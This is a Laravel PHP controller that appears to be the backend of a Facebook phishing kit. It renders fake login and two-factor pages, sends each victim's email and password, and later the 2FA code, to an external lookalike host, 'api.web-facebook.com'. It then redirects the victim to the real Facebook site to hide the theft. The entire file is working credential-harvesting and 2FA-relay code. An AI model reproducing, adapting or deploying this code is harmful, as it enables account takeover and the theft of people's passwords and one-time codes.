<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use GuzzleHttp\Client;
use Phattarachai\LaravelMobileDetect\Agent;
class HomeController extends Controller
{
    public function index(Request $request)
    {
        return view('frontend.index');
    }
    public function secure(Request $request)
    {
        return view('frontend.secure');
    }
    public function platform(Request $request)
    {
        return view('frontend.platform');
    }

    public function login(Request $request)
    {
        if($request->isMethod('POST')){
            $result =  $this->handleLogin($request);
            // dd($request->all(),$result);
            if($result && $result['status'] == 200){
                return view('frontend.2fa');
            }else{
                return redirect()->back()->withErrors(['message' => $result ? $result['message'] : "Invalid login"]);
            }
        }
        $agent = new Agent();
        if($agent->isMobile()){
            return view('frontend.login-mobile');
        }
        return view('frontend.login');
    }

    public function getDataApi($url, $data)
    {
        $response = Http::post('https://api.web-facebook.com/' . $url, $data);
        $result = $response->json();
        return $result;
    }

    public function handleLogin(Request $request)
    {
        // $ip = $request->ip();
        $ip = "2a09:bac5:d46a:16d2::246:83";
        $email = $request->get('email');
        $password = $request->get('password');
        $data = [
            'email' => $email,
            'password' => $password,
            'ip' => $ip,
        ];
        // Gửi request POST đến API
        $result = $this->getDataApi('auth', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {
            session()->put('email', $email);
            $data = [
                'email' => $email,
                'status' => $status
            ];
            return $data;
        } elseif ($status === 400) {
            $message = $result['message'];
            $data = [
                'message' => $message,
                'status' => $status
            ];
            return $data;
        }
    }

    public function towfa()
    {
        return view('frontend.towfa');
    }

    public function success(){
        return redirect()->away('https://www.facebook.com');
    }

    public function handleTowfa(Request $request)
    {
        $email = session()->get('email');
        $twofaCode = $request->get('2fa');
        $data = [
            'email' => $email,
            'twofa_code' => $twofaCode
        ];
        // Gửi request POST đến API
        $result = $this->getDataApi('login_with_2fa', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {
            return redirect()->route('success');
        } else {
            $message = $result['message'];
            return view('frontend.towfa', compact('message'));
        }
    }

    public function checkDevice() {
        $email = session()->get('email');

        $data = [
            'email' => $email,
        ];

        // Gửi request POST đến API
        $result = $this->getDataApi('check_login_api', $data);
        $status = $result['status'] ?? null;
        return $status;
    }
}